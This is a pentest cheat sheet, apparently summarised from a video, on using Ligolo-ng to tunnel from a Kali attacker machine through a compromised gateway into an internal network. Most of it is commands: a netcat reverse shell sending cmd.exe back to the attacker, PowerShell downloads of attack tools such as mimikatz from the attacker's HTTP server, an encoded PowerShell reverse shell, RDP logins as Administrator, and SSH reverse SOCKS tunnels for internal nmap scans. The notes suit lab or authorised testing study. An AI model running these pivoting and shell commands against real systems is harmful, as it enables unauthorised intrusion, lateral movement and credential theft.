# Ligolo-ng setup

Source: https://looptube.io/?videoId=DM1B8S80EvQ  

## Prerequisite

### Framework

| WAN | DMZ | Inside LAN |
|-----|-----|------------|
| Kali | Gateway | servers, workstations | 
| IpAttacker > | < eth0: IpDmzOut - eth1: IpDmzIn > | < IpInternalNetwork (DC, WS1, WS2) |

### Binary releases

Two downloads:
- an agent: on the gateway
- a proxy: on Kali

## Setup

### Config on Kali

```
sudo ip tuntap add user kaliuser mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

### Config on the gateway

```
cmd> agent.exe -connect $IpKali:$PortKali -ignore-cert
```

### Tunneling on Ligolo-ng

```
>> help
>> session
>>>> ifconfig
```

In a shell:
```
sudo ip route add $IpInternal/24 dev ligolo
ip route list # check
```

Back in Ligolo:
```
>>>> start
```

Check with NetExec:
```
NetExec smb $IpInternal/24
```

### Pivoting in Ligolo-ng

In Ligolo
```
>>>> listener_list
>>>> listener_add --addr 0.0.0.0:$Port1 --to 127.0.0.1:$Port2
>>>> listener_add --addr 0.0.0.0:$Port3 --to 127.0.0.1:$Port4
>>>> listener_list
```

On a WS or the DC:
```
PS> nc.exe $InternalGatewayIpOnEth1 $Port1 -e cmd.exe
PS> iwr -uri http://$InternalGatewayIpOnEth1:$Port3/somepentestingtool.exe -outfile tool.exe
```

On Kali:
```
nc -lnpu $Port2
python3 -m http.server $Port4
```

Examples:
- `0.0.0.0:4446` -> `127.0.0.1:4446` then `powershell -e base64enc($InternalIpForAgent01 $4446)`
- `0.0.0.0:8081` -> `127.0.0.1:8081` then `iwr -uri http://$InternalIpForAgent01:8181/mimikatz.exe -outfile mimi.exe` (and `python3 -m http.server 8081` in `/var/www/html`)
- `0.0.0.0:3389` -> `$IpForTarget02:3389` then `xfreerdp /u:Administrator /p:adminpass /v:$ExternalIpForAgent01`

Reverse dynamic tunelling:
- in ligolo: `listener_add --addr 0.0.0.0:22 --to 127.0.0.1:22`
- on internal gateway02: `ssh -N -R 2222 kaliuser@$InternalIpForAgent01`
- in `/etc/proxychains.conf`: `socks5 127.0.0.1 2222`
- in Kali: `proxychains nmap -n -Pn -sT -vvv --top-ports=20 --open -oN nmap_tcp_deepinIP.txt $DeepInTargetIp03`
- in Firefox: set up a Sock5 proxy with Ip=127.0.0.1 and port=2222 ; then browse to `http://$DeepInTarget03/` (or `proxychains curl http://$DeepInTarget03/` in cli).


